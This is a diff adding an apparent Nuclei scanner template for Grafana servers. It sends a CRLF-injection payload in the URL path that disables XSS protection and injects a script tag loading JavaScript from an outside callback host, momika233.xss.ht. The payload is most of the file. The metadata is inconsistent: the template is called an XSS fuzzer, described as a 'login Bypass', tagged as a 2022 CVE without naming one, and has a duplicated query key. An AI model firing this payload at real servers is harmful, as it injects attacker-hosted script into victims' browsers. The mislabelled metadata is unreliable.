@@ -1,0 +1,29 @@
+id: fuzzing_xss
+info:
+  name: fuzzing_xss
+  author: momika233
+  severity: medium
+  description: |
+    Grafana login Bypass
+  reference:
+    - https://github.com/momika233
+  metadata:
+    shodan-query: 
+    shodan-query: title:"Grafana"
+  tags: cve,cve2022,grafana,unauth
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/%0d%0aX-XSS-Protection:0%0d%0aContent-Type:%20text/html%0d%0a%0d%0a%3Chtml%3E%3Cscript%20src%3dhttps%3a%2f%2fmomika233.xss.ht%3E%3C%2fscript%3E"
+
+    matchers-condition: and
+    matchers:
+
+      - type: regex
+        regex:
+          - "momika233"
+
+      - type: status
+        status:
+          - 200
